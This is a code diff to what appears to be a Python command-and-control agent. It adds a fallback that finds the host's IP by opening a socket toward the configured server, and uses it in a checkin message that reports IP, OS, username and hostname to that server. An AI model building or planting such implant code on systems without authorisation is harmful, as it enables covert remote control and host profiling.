@@ -2,10 +2,22 @@ import os, random, sys, json, socket, base64, time, platform, ssl
 import urllib.request
 from datetime import datetime
 import threading, queue
+import re
 
 CHUNK_SIZE = 51200
 
 CRYPTO_HERE
+    def getIpAddress(self):
+        ip_address = ""
+        try:
+            ip_address = socket.gethostbyname(socket.gethostname())
+        except socket.gaierror:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect((re.sub("https?://", "", self.agent_config["Server"]), int(self.agent_config["Port"])))
+            ip_address = s.getsockname()[0]
+        finally:
+            return ip_address
+
 
     def getOSVersion(self):
         if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
@@ -112,7 +124,7 @@ CRYPTO_HERE
     def checkIn(self):
         data = {
             "action": "checkin",
-            "ip": socket.gethostbyname(socket.gethostname()),
+            "ip": self.getIpAddress(),
             "os": self.getOSVersion(),
             "user": self.getUsername(),
             "host": socket.gethostname(),
